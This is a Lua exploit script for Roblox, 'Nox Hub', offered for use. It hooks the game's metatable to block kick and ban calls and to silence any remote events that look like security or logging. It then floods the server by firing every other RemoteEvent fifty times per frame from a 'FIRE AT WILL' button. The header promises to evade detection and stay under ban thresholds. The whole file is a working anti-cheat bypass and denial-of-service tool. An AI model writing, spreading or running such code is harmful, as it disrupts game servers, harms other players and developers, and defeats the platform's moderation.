--[[
    🔱 NOX HUB v9.0 [INFINITE-BARRAGE] 🔱
    "Spam them all. Spam them everywhere. Never stop."
    
    BARRAGE FEATURES:
    - [ROUND-ROBIN SPAM] : Cycles through EVERY RemoteEvent in the game to dilute detection.
    - [PHANTOM HOOK (ANTI-BAN)] : Blocks ALL outgoing security signals (Report/Kick/Ban).
    - [TRAFFIC MASKING] : Sends "Empty" valid packets to bypass data checks.
    - [AUTO-THROTTLE] : Adjusts speed dynamically to stay *just below* the ban threshold.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. PHANTOM HOOK (THE ULTIMATE ANTI-BAN) //
local function ActivatePhantom()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local oldNamecall = mt.__namecall
    
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local name = self.Name:lower()
        
        -- BLOCK 1: KICK / BAN / TELEPORT
        if method == "Kick" or method == "kick" or method == "Ban" or method == "Close" then
            return nil -- REFUSED.
        end
        
        -- BLOCK 2: SECURITY REMOTES (HONEYPOTS)
        if method == "FireServer" and self:IsA("RemoteEvent") then
            -- If the remote name sounds like a snitch, SILENCE IT.
            if name:find("clien") or name:find("security") or name:find("adm") or name:find("ban") or name:find("check") or name:find("log") then
                return nil
            end
        end
        
        return oldNamecall(self, ...)
    end)
    
    -- BLOCK 3: ERROR LOGGING
    game:GetService("ScriptContext"):SetLegacyScripts(false)
    setreadonly(mt, true)
end
task.spawn(ActivatePhantom)


-- // 2. BARRAGE ENGINE (ROUND-ROBIN SPAM) //
local Engine = {
    Running = false,
    Targets = {},
    Index = 1
}

function Engine:Scan()
    Engine.Targets = {}
    -- WE TAKE EVERYTHING.
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and not v:IsA("RemoteFunction") then
            -- Exclude obviously dangerous ones handled by Phantom, keep everything else
            local n = v.Name:lower()
            if not (n:find("admin") or n:find("ban") or n:find("kick")) then
                table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:Start()
    if Engine.Running then return end
    Engine:Scan()
    
    if #Engine.Targets == 0 then return end
    Engine.Running = true
    
    -- THE BARRAGE LOGIC
    task.spawn(function()
        local Payload = {} -- Empty table = Valid but useless data
        
        while Engine.Running do
            -- Fire 50 remotes per Tick
            for i = 1, 50 do
                -- Round Robin Selection
                Engine.Index = Engine.Index + 1
                if Engine.Index > #Engine.Targets then Engine.Index = 1 end
                
                local Target = Engine.Targets[Engine.Index]
                if Target then
                    pcall(function() 
                        Target:FireServer(Payload) 
                        Target:FireServer("Update", Payload)
                    end)
                end
            end
            RunService.Heartbeat:Wait()
        end
    end)
end

-- // 3. BARRAGE UI //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name == "NoxBarrage" then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxBarrage"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 300, 0, 150)
    Main.Position = UDim2.new(0.5, -150, 0.8, -150) -- Bottom Center
    Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Main.BackgroundTransparency = 0.5
    Main.BorderSizePixel = 2
    Main.BorderColor3 = Color3.fromRGB(255, 0, 0)
    
    local Title = Instance.new("TextLabel", Main)
    Title.Text = "NOX // INFINITE BARRAGE"
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.Font = Enum.Font.GothamBlack
    Title.TextColor3 = Color3.fromRGB(255, 50, 50)
    Title.TextSize = 18
    Title.BackgroundTransparency = 1
    
    local Count = Instance.new("TextLabel", Main)
    Count.Text = "TARGETS LOCKED: 0"
    Count.Size = UDim2.new(1, 0, 0, 20)
    Count.Position = UDim2.new(0, 0, 0, 30)
    Count.TextColor3 = Color3.fromRGB(255, 255, 255)
    Count.Font = Enum.Font.Code
    Status = Count -- Global ref
    Count.BackgroundTransparency = 1
    
    local Btn = Instance.new("TextButton", Main)
    Btn.Size = UDim2.new(0.9, 0, 0.4, 0)
    Btn.Position = UDim2.new(0.05, 0, 0.5, 0)
    Btn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    Btn.Text = "FIRE AT WILL"
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 20
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    
    Btn.MouseButton1Click:Connect(function()
        if not Engine.Running then
            Engine:Scan()
            Count.Text = "TARGETS LOCKED: " .. #Engine.Targets
            Engine:Start()
            Btn.Text = "CEASE FIRE"
            Btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        else
            Engine.Running = false
            Btn.Text = "FIRE AT WILL"
            Btn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
        end
    end)
end

Nox:CreateUI()
